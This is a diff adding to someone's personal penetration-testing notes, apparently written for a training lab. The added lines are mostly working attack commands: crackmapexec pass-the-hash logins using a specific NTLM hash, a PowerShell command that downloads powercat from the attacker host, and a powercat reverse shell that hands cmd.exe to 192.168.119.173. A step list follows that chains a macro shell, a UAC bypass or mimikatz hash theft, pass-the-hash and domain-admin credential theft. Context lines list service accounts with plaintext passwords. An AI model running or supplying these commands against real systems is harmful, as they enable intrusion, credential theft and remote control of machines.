@@ -29,3 +29,24 @@ Follow this guide for bypassing UAC: https://ivanitlearning.wordpress.com/2019/0
 		sqlServer:ThisIsTheUsersPassword23
 		HP3service:ThisIsTheUsersPassword24
 		extmailservice:ThisIsTheUsersPassword25
+
+crackmapexec smb 10.11.1.20 10.11.1.21 10.11.1.22 10.11.1.23 10.11.1.24 -u Administrator -H ee0c207898a5bccc01f38115019ca2fb --local-auth
+	USE LOCAL AUTH YOU DUMMY
+	local auth for reused admin passwords, no local auth for domain users
+
+getting a shell (by hand) with CME
+	crackmapexec smb 10.11.1.24 -u Administrator -H ee0c207898a5bccc01f38115019ca2fb --local-auth -x "powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.173/powercat.ps1', 'powercat.ps1')"
+	crackmapexec smb 10.11.1.24 -u Administrator -H ee0c207898a5bccc01f38115019ca2fb --local-auth -x "powershell.exe -ExecutionPolicy bypass Import-Module .\powercat.ps1; powercat -c 192.168.119.173 -p 9001 -e cmd.exe)"
+
+repeat the process of popping boxes, stealing creds with mimikatz and CME
+
+process
+	macro shell on 22
+	elevate to system with UAC bypass OR steal admin hash with mimikatz
+	PTH to 24
+	steal creds for pete on 24
+	PTH to next box and steal creds for tris who is DA
+
+
+if i ever get comfy wit empire
+		https://wiki.porchetta.industries/smb-protocol/command-execution/execute-remote-command
